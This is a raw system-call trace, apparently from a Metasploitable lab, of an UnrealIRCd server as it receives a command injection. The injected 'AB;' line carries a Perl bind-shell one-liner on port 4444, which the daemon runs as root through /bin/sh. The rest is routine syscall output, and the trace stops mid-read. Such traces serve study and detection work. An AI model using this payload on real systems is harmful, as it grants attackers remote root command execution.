4519  07:11:34.180435 select(1024, [2 3 4 7 9], [], NULL, {0, 790000}) = 1 (in [7], left {0, 750000})
4519  07:11:34.216913 clock_gettime(CLOCK_MONOTONIC, {1104, 33934811}) = 0
4519  07:11:34.216936 recv(7, "PRIVMSG  #testit2 ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 71
4519  07:11:34.216967 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 100000}, ...}) = 0
4519  07:11:34.216984 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 100000}, ...}) = 0
4519  07:11:34.216999 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 100000}, ...}) = 0
4519  07:11:34.217013 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 100000}, ...}) = 0
4519  07:11:34.217026 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 100000}, ...}) = 0
4519  07:11:34.217040 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 100000}, ...}) = 0
4519  07:11:34.217053 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 100000}, ...}) = 0
4519  07:11:34.217066 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 100000}, ...}) = 0
4519  07:11:34.217079 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 100000}, ...}) = 0
4519  07:11:34.217093 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 100000}, ...}) = 0
4519  07:11:34.217106 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 100000}, ...}) = 0
4519  07:11:34.217119 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 100000}, ...}) = 0
4519  07:11:34.217132 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 100000}, ...}) = 0
4519  07:11:34.217145 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 100000}, ...}) = 0
4519  07:11:34.217158 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 100000}, ...}) = 0
4519  07:11:34.217171 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 100000}, ...}) = 0
4519  07:11:34.217184 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 100000}, ...}) = 0
4519  07:11:34.217197 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 100000}, ...}) = 0
4519  07:11:34.217210 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 100000}, ...}) = 0
4519  07:11:34.217239 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 100000}, ...}) = 0
4519  07:11:34.217274 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 100000}, ...}) = 0
4519  07:11:34.217304 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 100000}, ...}) = 0
4519  07:11:34.217320 gettimeofday({1495624294, 217324}, NULL) = 0
4519  07:11:34.217332 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {0, 840000})
4519  07:11:34.384607 clock_gettime(CLOCK_MONOTONIC, {1104, 201643957}) = 0
4519  07:11:34.384663 time(NULL)        = 1495624294
4519  07:11:34.384677 time(NULL)        = 1495624294
4519  07:11:34.384705 gettimeofday({1495624294, 384709}, NULL) = 0
4519  07:11:34.384717 select(1024, [2], [], NULL, {0, 0}) = 1 (in [2], left {0, 0})
4519  07:11:34.384857 clock_gettime(CLOCK_MONOTONIC, {1104, 201885367}) = 0
4519  07:11:34.384883 gettimeofday({1495624294, 384887}, NULL) = 0
4519  07:11:34.384893 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {1, 0})
4519  07:11:34.384932 clock_gettime(CLOCK_MONOTONIC, {1104, 201944295}) = 0
4519  07:11:34.384942 accept(2, 0, NULL) = 5
4519  07:11:34.384961 getpeername(5, {sa_family=AF_INET, sin_port=htons(32961), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  07:11:34.384993 fcntl64(5, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:11:34.385006 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:11:34.385019 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  07:11:34.385031 setsockopt(5, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  07:11:34.385042 setsockopt(5, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  07:11:34.385053 getsockopt(5, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  07:11:34.385065 setsockopt(5, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  07:11:34.385082 clock_gettime(CLOCK_MONOTONIC, {1104, 202095344}) = 0
4519  07:11:34.385093 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 6
4519  07:11:34.385105 fcntl64(6, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:11:34.385114 fcntl64(6, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:11:34.385133 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
4519  07:11:34.385143 connect(6, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  07:11:34.385159 send(6, "j)\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  07:11:34.385278 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  07:11:34.385315 gettimeofday({1495624294, 385319}, NULL) = 0
4519  07:11:34.385327 select(1024, [2 3 4 6 7 9], [], NULL, {1, 0}) = 1 (in [6], left {0, 990000})
4519  07:11:34.387603 clock_gettime(CLOCK_MONOTONIC, {1104, 204612440}) = 0
4519  07:11:34.387604 recvfrom(6, "j)\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\0F\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  07:11:34.387620 close(6)          = 0
4519  07:11:34.387638 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  07:11:34.387666 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 174, 0) = 174
4519  07:11:34.387747 time(NULL)        = 1495624294
4519  07:11:34.387774 time(NULL)        = 1495624294
4519  07:11:34.387786 gettimeofday({1495624294, 387790}, NULL) = 0
4519  07:11:34.387798 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:11:34.387827 clock_gettime(CLOCK_MONOTONIC, {1104, 204839797}) = 0
4519  07:11:34.387857 gettimeofday({1495624294, 387860}, NULL) = 0
4519  07:11:34.387921 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 0 (Timeout)
4519  07:11:35.387474 clock_gettime(CLOCK_MONOTONIC, {1105, 204496149}) = 0
4519  07:11:35.387499 gettimeofday({1495624295, 387503}, NULL) = 0
4519  07:11:35.387511 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  07:11:35.387553 clock_gettime(CLOCK_MONOTONIC, {1105, 204565706}) = 0
4519  07:11:35.387565 recv(5, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  07:11:35.387595 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  07:11:35.387616 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  07:11:35.387628 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  07:11:35.387642 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 5968
5968  07:11:35.387715 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
5968  07:11:35.387729 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
5968  07:11:35.387739 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5968  07:11:35.387752 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
5968  07:11:35.387870 brk(0)            = 0x80f9000
5968  07:11:35.387924 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5968  07:11:35.387959 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f83000
5968  07:11:35.387989 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
5968  07:11:35.388007 open("/etc/ld.so.cache", O_RDONLY) = 1
5968  07:11:35.388019 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
5968  07:11:35.388037 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f7b000
5968  07:11:35.388047 close(1)          = 0
5968  07:11:35.388058 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5968  07:11:35.388073 open("/lib/libncurses.so.5", O_RDONLY) = 1
5968  07:11:35.388093 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
5968  07:11:35.388186 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
5968  07:11:35.388203 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f4b000
5968  07:11:35.388215 mmap2(0xb7f78000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7f78000
5968  07:11:35.388232 close(1)          = 0
5968  07:11:35.388244 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5968  07:11:35.388257 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
5968  07:11:35.388271 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
5968  07:11:35.388408 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
5968  07:11:35.388441 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f47000
5968  07:11:35.388468 mmap2(0xb7f49000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f49000
5968  07:11:35.388519 close(1)          = 0
5968  07:11:35.388531 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5968  07:11:35.388545 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
5968  07:11:35.388559 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
5968  07:11:35.388663 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
5968  07:11:35.388699 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f46000
5968  07:11:35.388728 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7df7000
5968  07:11:35.388954 mmap2(0xb7f40000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f40000
5968  07:11:35.388972 mmap2(0xb7f43000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f43000
5968  07:11:35.388987 close(1)          = 0
5968  07:11:35.389011 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7df6000
5968  07:11:35.389036 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7df66b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
5968  07:11:35.389091 mprotect(0xb7f40000, 4096, PROT_READ) = 0
5968  07:11:35.389128 munmap(0xb7f7b000, 29913) = 0
5968  07:11:35.389154 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
5968  07:11:35.389168 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
5968  07:11:35.389188 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd63f20) = -1 ENOTTY (Inappropriate ioctl for device)
5968  07:11:35.389219 brk(0)            = 0x80f9000
5968  07:11:35.389229 brk(0x80fa000)    = 0x80fa000
5968  07:11:35.389240 brk(0x80fb000)    = 0x80fb000
5968  07:11:35.389256 getuid32()        = 0
5968  07:11:35.389265 getgid32()        = 0
5968  07:11:35.389274 geteuid32()       = 0
5968  07:11:35.389283 getegid32()       = 0
5968  07:11:35.389296 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
5968  07:11:35.389309 time(NULL)        = 1495624295
5968  07:11:35.389322 brk(0x80fc000)    = 0x80fc000
5968  07:11:35.389336 brk(0x80fd000)    = 0x80fd000
5968  07:11:35.389445 open("/proc/meminfo", O_RDONLY) = 1
5968  07:11:35.389496 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
5968  07:11:35.389514 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f82000
5968  07:11:35.389540 read(1, "MemTotal:      1035240 kB\nMemFree:        625740 kB\nBuffers:         63640 kB\nCached:         190240 kB\nSwapCached:          0 kB\nActive:         252244 kB\nInactive:       130556 kB\nHighTotal:      131008 kB\nHighFree:          240 kB\nLowTotal:       904232 kB\nLowFree:        625500 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            5804 kB\nWriteback:           0 kB\nAnonPages:      128980 kB\nMapped:          52008 kB\nSlab:            15240 kB\nSReclaimable:     7244 kB\nSUnreclaim:       7996 kB\nPageTables:       1956 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   635396 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
5968  07:11:35.389628 close(1)          = 0
5968  07:11:35.389639 munmap(0xb7f82000, 4096) = 0
5968  07:11:35.389651 brk(0x80fe000)    = 0x80fe000
5968  07:11:35.389677 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
5968  07:11:35.389689 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
5968  07:11:35.389701 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
5968  07:11:35.389713 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
5968  07:11:35.389724 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
5968  07:11:35.389736 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
5968  07:11:35.389749 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
5968  07:11:35.389764 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
5968  07:11:35.389777 uname({sys="Linux", node="metasploitable", ...}) = 0
5968  07:11:35.389824 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5968  07:11:35.389841 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
5968  07:11:35.389859 brk(0x8100000)    = 0x8100000
5968  07:11:35.389871 getcwd("/etc/unreal", 4096) = 12
5968  07:11:35.389885 getpid()          = 5968
5968  07:11:35.389902 getppid()         = 4519
5968  07:11:35.389917 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
5968  07:11:35.389948 stat64("/sbin/sh", 0xbfd63ef8) = -1 ENOENT (No such file or directory)
5968  07:11:35.389988 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
5968  07:11:35.390020 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
5968  07:11:35.390043 socket(PF_FILE, SOCK_STREAM, 0) = 1
5968  07:11:35.390056 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
5968  07:11:35.390068 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
5968  07:11:35.390089 close(1)          = 0
5968  07:11:35.390101 socket(PF_FILE, SOCK_STREAM, 0) = 1
5968  07:11:35.390110 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
5968  07:11:35.390120 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
5968  07:11:35.390138 close(1)          = 0
5968  07:11:35.390151 open("/etc/nsswitch.conf", O_RDONLY) = 1
5968  07:11:35.390165 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
5968  07:11:35.390181 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f82000
5968  07:11:35.390192 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
5968  07:11:35.390240 read(1, "", 4096) = 0
5968  07:11:35.390249 close(1)          = 0
5968  07:11:35.390258 munmap(0xb7f82000, 4096) = 0
5968  07:11:35.390275 open("/etc/ld.so.cache", O_RDONLY) = 1
5968  07:11:35.390287 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
5968  07:11:35.390303 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f7b000
5968  07:11:35.390313 close(1)          = 0
5968  07:11:35.390323 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5968  07:11:35.390338 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
5968  07:11:35.390352 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
5968  07:11:35.390507 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
5968  07:11:35.390546 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ded000
5968  07:11:35.390559 mmap2(0xb7df4000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7df4000
5968  07:11:35.390589 close(1)          = 0
5968  07:11:35.390600 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5968  07:11:35.390614 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
5968  07:11:35.390627 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 